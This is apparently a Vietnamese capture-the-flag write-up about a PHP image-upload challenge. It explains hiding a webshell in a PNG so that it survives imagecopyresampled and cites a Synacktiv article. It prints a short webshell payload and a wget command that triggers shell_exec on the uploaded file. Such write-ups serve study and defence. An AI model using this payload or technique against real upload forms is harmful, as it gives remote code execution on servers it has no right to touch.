- tiều đề : Image Copy Resampled 
- nội dung : RCE 

- khá khoai đây :>>> 
- NOTE : bài này mình research và tìm hiểu là chính (thật ra là k đủ trình dựng lại payload :v )

- okay let go view page cái đã 
- thì mình được upload 3 loại nha ae (jpg, png, php)
- nhìn thoi là cũng biết phải up thằng nào roi :>>

- nhưng vấn đề là khi ae up 1 file php với nội dung thuần php hoặc tự inject không theo chuẩn thì hàm imagecreatefromstring nó íu hiểu và luôn trả về 1 chuẩn png

![Alt text](<./img/1.1.png>)

- uhm lúc này mình đọc source và đi research ( mấy hàm này ít dùng hơi thiếu kiến thực :v )
- okay sau hơn 1h đọc tài liệu trên php.net và search mình cũng thấy được long mạch :> 
- thì nói tổng quát lỗi là từ thằng thư viện xử lý ảnh PD trong php 

![Alt text](<./img/1.3.png>)

- mình mất rất lâu để ngồi đọc vì khá ghét không hiểu mà cứ nhét payload :v ( ngu giải thích nên mình để link cho ae nghiên cứu nhee hay mà hehe )
- túm lại là nó lỗi để mình đăng php -> tìm cách nhét shell vào -> sao cho sau khi resize các thứ shell vẫn okee

- ![Alt text](<./img/1.2.png>)

- giờ mình cầm thằng code này chạy php lấy kết quả và up lên 
- payload chính của nó là <?=$GET[0](POST[1]);?> ( họ có giải thích là vì chữ in hoa tốt hơn và payload ngắn sẽ okay hơn ...)

- up được rồi thì mình wget url?0=shell_exec --post-data '1=ls' ( để truyền tham số kích hoạt shell )

![Alt text](<./img/1.4.png>)

![Alt text](<./img/1.6.png>)

#hackerga2101:
- https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html